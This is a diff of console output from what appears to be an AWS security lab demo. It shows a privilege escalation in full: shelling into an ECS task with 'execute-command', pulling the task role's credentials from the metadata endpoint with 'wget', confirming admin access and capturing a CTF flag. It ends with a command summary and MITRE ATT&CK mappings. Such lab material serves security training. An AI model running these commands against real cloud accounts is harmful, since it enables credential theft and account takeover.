@@ -35,13 +35,13 @@ Attempting to list IAM users (should fail)...
 
 [1;33mStep 5: Discovering ECS tasks in the cluster[0m
 Cluster: pl-prod-ecs-006-to-admin-cluster
-Found task: arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/21fbae3250e346c0a817d702f547c2c5
+Found task: arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/4f23ea6c83bb4d75afe622366d1edd6f
 [0;32mCompleted: Discovered running ECS task[0m
 
 [1;33mStep 6: Getting task details[0m
 
-[0;36m[ReadOnly] $ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-006-to-admin-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/21fbae3250e346c0a817d702f547c2c5 --output json[0m
-Task Definition: arn:aws:ecs:us-east-1:123456789012:task-definition/pl-prod-ecs-006-to-admin-task:3
+[0;36m[ReadOnly] $ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-006-to-admin-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/4f23ea6c83bb4d75afe622366d1edd6f --output json[0m
+Task Definition: arn:aws:ecs:us-east-1:123456789012:task-definition/pl-prod-ecs-006-to-admin-task:4
 Task Status: RUNNING
 Task Role ARN: arn:aws:iam::123456789012:role/pl-prod-ecs-006-to-admin-target-role
 [0;32mCompleted: Task has the admin role attached![0m
@@ -53,47 +53,95 @@ The ExecuteCommandAgent needs time to initialize after task startup...
 [1;33mStep 8: Executing command on ECS task to retrieve credentials[0m
 This is the privilege escalation - we shell into the task and access its IAM role credentials
 
-[0;34mCommand: aws ecs execute-command --cluster pl-prod-ecs-006-to-admin-cluster --task arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/21fbae3250e346c0a817d702f547c2c5 --container sleep-container --interactive --command <command>[0m
+[0;34mCommand: aws ecs execute-command --cluster pl-prod-ecs-006-to-admin-cluster --task arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/4f23ea6c83bb4d75afe622366d1edd6f --container sleep-container --interactive --command <command>[0m
 
 Retrieving credentials from ECS task metadata endpoint...
 Endpoint: 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
 
 
-[0;36m[Attacker] $ aws ecs execute-command --region us-east-1 --cluster pl-prod-ecs-006-to-admin-cluster --task arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/21fbae3250e346c0a817d702f547c2c5 --container sleep-container --interactive --command 'sh -c "wget -qO- 169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"'[0m
+[0;36m[Attacker] $ aws ecs execute-command --region us-east-1 --cluster pl-prod-ecs-006-to-admin-cluster --task arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/4f23ea6c83bb4d75afe622366d1edd6f --container sleep-container --interactive --command 'sh -c "wget -qO- 169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"'[0m
 [0;32mSuccessfully retrieved credentials from ECS task![0m
 
 Retrieved credentials:
   Access Key ID: ASIA2E4JP2...
   Secret Access Key: [REDACTED]
-  Session Token: IQoJb3JpZ2luX2VjENz/...
+  Session Token: IQoJb3JpZ2luX2VjEPL/...
 [0;32mCompleted: Retrieved admin role credentials from task metadata[0m
 
 [1;33mStep 9: Verifying administrator access with stolen credentials[0m
 Verifying new identity...
 [2m[Attacker] $ aws sts get-caller-identity --output json[0m
 {
-  "UserId": "AROA2E4JP2KMJCS4ZQ44L:21fbae3250e346c0a817d702f547c2c5",
+  "UserId": "AROA2E4JP2KMB6JMXZFBG:4f23ea6c83bb4d75afe622366d1edd6f",
   "Account": "697683661464",
-  "Arn": "arn:aws:sts::123456789012:assumed-role/pl-prod-ecs-006-to-admin-target-role/21fbae3250e346c0a817d702f547c2c5"
+  "Arn": "arn:aws:sts::123456789012:assumed-role/pl-prod-ecs-006-to-admin-target-role/4f23ea6c83bb4d75afe622366d1edd6f"
 }
 [0;32mCompleted: Now operating as the admin role![0m
 
 [1;33mStep 10: Verifying administrator access[0m
 Attempting to list IAM users...
-[2m[Attacker] $ aws iam list-users --max-items 3 --output table --no-cli-pager[0m
-[0;31mFailed to list users - credentials may have expired or lack permissions[0m
-[1;33m[demo_permissions] Restoring permissions on exit...[0m
+[2m[Attacker] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32mCompleted: Successfully listed IAM users![0m
+[0;32mADMIN ACCESS CONFIRMED[0m
+
+[1;33mStep 11: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (task role)] $ aws ssm get-parameter --name /pathfinding-labs/flags/ecs-006-to-admin --query 'Parameter.Value' --output text[0m
+[0;32mFlag captured: flag{ecs_006_admin_captured}[0m
+
 [1;33m[demo_permissions] Restoring helpful permissions...[0m
   Restored user: pl-prod-ecs-006-to-admin-starting-user
 [0;32m[demo_permissions] Helpful permissions restored[0m
-usage: 
-Note: AWS CLI version 2, the latest major version of the AWS CLI, is now stable and recommended for general use. For more information, see the AWS CLI version 2 installation instructions at: https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html
 
-usage: aws [options] <command> <subcommand> [<subcommand> ...] [parameters]
-To see help text, you can run:
+[0;32m========================================[0m
+[0;32mCTF FLAG CAPTURED![0m
+[0;32m========================================[0m
 
-  aws help
-  aws <command> help
-  aws <command> <subcommand> help
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-ecs-006-to-admin-starting-user (with ecs:ExecuteCommand permissions)
+2. Discovered running ECS task in cluster: pl-prod-ecs-006-to-admin-cluster
+3. Task was running with admin role: pl-prod-ecs-006-to-admin-target-role
+4. Used ecs:ExecuteCommand to shell into the task
+5. Retrieved IAM role credentials from task metadata endpoint
+6. Achieved: Administrator Access via stolen task role credentials
+7. Captured CTF flag from SSM Parameter Store: flag{ecs_006_admin_captured}
 
-Unknown options: --no-cli-pager
+[1;33mAttack Path:[0m
+  pl-prod-ecs-006-to-admin-starting-user
+  -> (ecs:ExecuteCommand + ecs:DescribeTasks) -> ECS Task Container
+  -> (curl metadata) -> pl-prod-ecs-006-to-admin-target-role credentials
+  -> (ssm:GetParameter) -> CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws ecs describe-tasks --region us-east-1 --cluster pl-prod-ecs-006-to-admin-cluster --tasks arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/4f23ea6c83bb4d75afe622366d1edd6f --output json[0m
+  [0;36m$ aws ecs execute-command --region us-east-1 --cluster pl-prod-ecs-006-to-admin-cluster --task arn:aws:ecs:us-east-1:123456789012:task/pl-prod-ecs-006-to-admin-cluster/4f23ea6c83bb4d75afe622366d1edd6f --container sleep-container --interactive --command 'sh -c "wget -qO- 169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"'[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/ecs-006-to-admin --query 'Parameter.Value' --output text[0m
+
+[1;33mKey Insight:[0m
+The ecs:ExecuteCommand permission allows shelling into any running ECS task.
+If a task has a privileged IAM role, the attacker can retrieve those credentials
+from the container metadata endpoint (169.254.170.2) and use them directly.
+
+[1;33mNo Cleanup Required:[0m
+This attack only reads existing credentials - no artifacts are created.
+The stolen credentials are temporary (session credentials) and will expire.
+
+[1;33mMITRE ATT&CK Techniques:[0m
+  - T1552.005: Unsecured Credentials: Cloud Instance Metadata API
+  - T1059: Command and Scripting Interpreter
+  - TA0004: Privilege Escalation
+  - TA0006: Credential Access
+
